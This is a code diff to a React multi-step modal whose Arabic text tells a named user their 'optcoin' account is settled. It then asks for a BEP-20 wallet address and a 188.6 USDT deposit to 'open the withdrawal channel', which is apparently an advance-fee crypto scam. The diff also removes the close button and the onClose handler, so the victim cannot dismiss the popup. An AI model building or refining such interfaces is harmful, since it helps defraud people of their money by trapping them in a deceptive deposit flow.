@@ -6,7 +6,7 @@ interface MultiStepModalProps {
   onClose: () => void;
 }
 
-const MultiStepModal: React.FC<MultiStepModalProps> = ({ isOpen, onClose }) => {
+const MultiStepModal: React.FC<MultiStepModalProps> = ({ isOpen }) => {
   const [step, setStep] = useState(1);
   const [formData, setFormData] = useState({
     platformLink: '',
@@ -21,7 +21,7 @@ const MultiStepModal: React.FC<MultiStepModalProps> = ({ isOpen, onClose }) => {
     switch (step) {
       case 1:
         return (
-          <div className="space-y-4 animate-in fade-in zoom-in duration-300">
+          <div className="space-y-4">
             <p className="text-[15px] leading-relaxed text-right">
               أهلاً بك <span className="text-[#f0b90b] font-bold">A5VSVP5CH000</span> تم تسوية حسابك <span className="font-bold">optcoin</span> وسيتم فتح قناة السحب. 
               اتبع التعليمات وقم بوضع رابط المنصة <span className="text-[#f0b90b]">mini pro</span> لقسم الإيداع حصراً.
@@ -44,7 +44,7 @@ const MultiStepModal: React.FC<MultiStepModalProps> = ({ isOpen, onClose }) => {
         );
       case 2:
         return (
-          <div className="space-y-4 animate-in slide-in-from-right duration-300">
+          <div className="space-y-4">
             <p className="text-[15px] text-right">يرجى إدخال عنوان محفظة BEP-20 الخاصة بك:</p>
             <input
               type="text"
@@ -64,7 +64,7 @@ const MultiStepModal: React.FC<MultiStepModalProps> = ({ isOpen, onClose }) => {
         );
       case 3:
         return (
-          <div className="space-y-4 animate-in slide-in-from-right duration-300">
+          <div className="space-y-4">
             <p className="text-[14px] leading-relaxed text-right">
               أهلاً بك <span className="text-[#f0b90b] font-bold">A5VSVP5CH000</span> بقي أمر إيداع مبلغ <span className="font-bold text-[#f0b90b]">188.6 USDT (BEP-20)</span> لفتح قناة السحب.
             </p>
@@ -85,7 +85,7 @@ const MultiStepModal: React.FC<MultiStepModalProps> = ({ isOpen, onClose }) => {
         );
       case 4:
         return (
-          <div className="py-8 flex flex-col items-center space-y-4 animate-in zoom-in duration-300">
+          <div className="py-8 flex flex-col items-center space-y-4">
             <div className="w-12 h-12 border-4 border-[#f0b90b] border-t-transparent rounded-full animate-spin"></div>
             <p className="text-[16px] font-bold text-center">الرجاء الانتظار للتأكد من عملية الإيداع</p>
           </div>
@@ -97,12 +97,11 @@ const MultiStepModal: React.FC<MultiStepModalProps> = ({ isOpen, onClose }) => {
 
   return (
     <div className="fixed inset-0 z-[200] flex items-center justify-center p-6">
-      {/* Backdrop - clicking it no longer closes the modal */}
-      <div className="absolute inset-0 bg-black/60 backdrop-blur-[2px]"></div>
+      {/* خلفية معتمة خفيفة بدون إمكانية إغلاق */}
+      <div className="absolute inset-0 bg-black/50 backdrop-blur-[1px]"></div>
       
-      {/* Dialog */}
+      {/* نافذة الحوار */}
       <div className="relative w-full max-w-[340px] bg-[#1e2329] border border-[#2b2f36] rounded-2xl p-6 shadow-2xl text-white">
-        {/* Close button ('X') has been removed as per request */}
         {renderStep()}
       </div>
     </div>
